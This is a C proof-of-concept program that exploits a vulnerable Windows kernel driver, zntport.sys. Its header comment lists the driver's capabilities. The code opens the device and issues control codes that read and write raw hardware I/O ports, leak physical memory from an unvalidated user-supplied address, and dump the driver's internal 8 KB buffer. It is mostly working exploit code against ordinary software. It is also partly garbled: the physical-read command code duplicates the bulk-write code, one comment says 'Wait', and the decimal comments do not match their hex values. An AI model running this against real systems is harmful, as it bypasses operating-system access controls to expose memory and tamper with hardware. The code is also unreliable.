/*
 ============================================================================
 Driver Capabilities Summary (zntport.sys)
 ============================================================================
 
 1. Low-Level Hardware Port I/O:
    - Allows user-mode applications to read and write directly to hardware I/O 
      ports using CPU intrinsics (__inbyte, __outbyte, __inword, __outword, 
      __indword, __outdword) as well as execute bulk port write loops.
 
 2. Arbitrary Physical Memory Read (Vulnerability):
    - Accepts a raw 32-bit physical address from user-mode without any 
      validation, maps 0x32 bytes into system space via MmMapIoSpace, and 
      copies the contents back to the user buffer via strcpy, entirely 
      bypassing operating system access controls.
 
 3. Internal Global Buffer Manipulation:
    - Allocates and manages an internal 8 KB (0x2000 bytes) non-cached global 
      memory block. User-mode can initialize it with 0xFF values, read/write 
      individual bytes at specific offsets, or dump the entire 8 KB contents.
 
 4. Hardware Bus & Device Enumeration:
    - Dynamically queries system device descriptions and controller configurations 
      across available hardware interface types using IoQueryDeviceDescription.
 ============================================================================
*/

#include <windows.h>
#include <stdio.h>

#define DEVICE_NAME L"\\\\.\\zntport"

// Define command codes based on the switch cases
#define CMD_INIT_MAGIC_1         0xF0FFFE00 // -251649024
#define CMD_INIT_MAGIC_2         0xF0FFFE04 // -251649020
#define CMD_INIT_GLOBAL_BUF      0xF0FFFE60 // -251648960
#define CMD_WRITE_GLOBAL_BYTE    0xF0FFFE54 // -251648956
#define CMD_READ_GLOBAL_BYTE     0xF0FFFE58 // -251648952
#define CMD_DUMP_GLOBAL_BUF      0xF0FFFE4C // -251648948
#define CMD_PORT_READ            0xF0FFFE20 // -251648832
#define CMD_PORT_WRITE           0xF0FFFE1C // -251648828
#define CMD_QUERY_DEVICE_DESC    0xF0FFFE18 // -251648824
#define CMD_PHYSICAL_MEM_READ    0xF0FFFE10 // Wait: 0xF0FFFE14 (-251648820) -> Physical Memory Read
#define CMD_BULK_PORT_WRITE      0xF0FFFE10 // -251648816

// Helper function to send commands to the driver
BOOL SendZntCommand(HANDLE hDevice, DWORD commandCode, LPVOID buffer, DWORD bufferSize, LPDWORD bytesReturned)
{
    // The driver expects message type 14 in the header, and the command code embedded 
    // depending on how the IRP parameters are structured. Adjust the payload layout as needed.
    return DeviceIoControl(
        hDevice,
        commandCode, // Using the code directly as IOCTL or control message selector
        buffer,
        bufferSize,
        buffer,
        bufferSize,
        bytesReturned,
        NULL
    );
}

int wmain(int argc, wchar_t* argv[])
{
    wprintf(L"[+] Comprehensive PoC for zntport Driver Commands\n");

    HANDLE hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] Failed to open device handle. Error: %d\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Successfully opened handle to %s\n", DEVICE_NAME);

    char buffer[0x2000] = { 0 };
    DWORD bytesReturned = 0;

    // ---------------------------------------------------------
    // 1. Port Read PoC (Example: Reading from a port like 0xCF8 or custom port)
    // ---------------------------------------------------------
    wprintf(L"\n[+] Testing Port Read (CMD: 0xF0FFFE20)...\n");
    memset(buffer, 0, sizeof(buffer));
    *(USHORT*)buffer = 0xCF8;          // Port Address
    *(DWORD*)(buffer + 4) = 4;         // Size width: 4 bytes (DWORD)

    if (SendZntCommand(hDevice, CMD_PORT_READ, buffer, 0x10, &bytesReturned))
    {
        wprintf(L"[+] Port Read Success! Read Value: 0x%08X\n", *(DWORD*)buffer);
    }
    else
    {
        wprintf(L"[-] Port Read Failed. Error: %d\n", GetLastError());
    }

    // ---------------------------------------------------------
    // 2. Port Write PoC
    // ---------------------------------------------------------
    wprintf(L"\n[+] Testing Port Write (CMD: 0xF0FFFE1C)...\n");
    memset(buffer, 0, sizeof(buffer));
    *(USHORT*)buffer = 0xCF8;          // Port Address
    *(DWORD*)(buffer + 4) = 4;         // Size width: 4 bytes
    *(DWORD*)(buffer + 8) = 0x80000000; // Data to write

    if (SendZntCommand(hDevice, CMD_PORT_WRITE, buffer, 0x10, &bytesReturned))
    {
        wprintf(L"[+] Port Write Executed Successfully.\n");
    }
    else
    {
        wprintf(L"[-] Port Write Failed. Error: %d\n", GetLastError());
    }

    // ---------------------------------------------------------
    // 3. Arbitrary Physical Memory Read PoC (Vulnerability)
    // ---------------------------------------------------------
    wprintf(L"\n[+] Testing Arbitrary Physical Memory Read (CMD: 0xF0FFFE14)...\n");
    memset(buffer, 0, sizeof(buffer));
    DWORD targetPhysicalAddress = 0x00001000; // Target physical address
    *(DWORD*)buffer = targetPhysicalAddress;

    if (SendZntCommand(hDevice, CMD_PHYSICAL_MEM_READ, buffer, 0x100, &bytesReturned))
    {
        wprintf(L"[+] Physical Memory Read Success! Leaked 0x32 bytes:\n");
        for (int i = 0; i < 0x32; i++)
        {
            wprintf(L"%02X ", (unsigned char)buffer[i]);
            if ((i + 1) % 16 == 0) wprintf(L"\n");
        }
        wprintf(L"\n");
    }
    else
    {
        wprintf(L"[-] Physical Memory Read Failed. Error: %d\n", GetLastError());
    }

    // ---------------------------------------------------------
    // 4. Global Buffer Dump PoC (Reads 8KB internal driver memory)
    // ---------------------------------------------------------
    wprintf(L"\n[+] Testing Global Buffer Dump (CMD: 0xF0FFFE4C)...\n");
    memset(buffer, 0, sizeof(buffer));

    if (SendZntCommand(hDevice, CMD_DUMP_GLOBAL_BUF, buffer, sizeof(buffer), &bytesReturned))
    {
        wprintf(L"[+] Global Buffer Dumped Successfully! Bytes received: %d\n", bytesReturned);
        // Print first 32 bytes of the dump
        wprintf(L"[+] First 32 bytes of driver global memory:\n");
        for (int i = 0; i < 32; i++)
        {
            wprintf(L"%02X ", (unsigned char)buffer[i]);
        }
        wprintf(L"\n");
    }
    else
    {
        wprintf(L"[-] Global Buffer Dump Failed. Error: %d\n", GetLastError());
    }

    CloseHandle(hDevice);
    wprintf(L"\n[+] PoC execution finished.\n");
    return 0;
}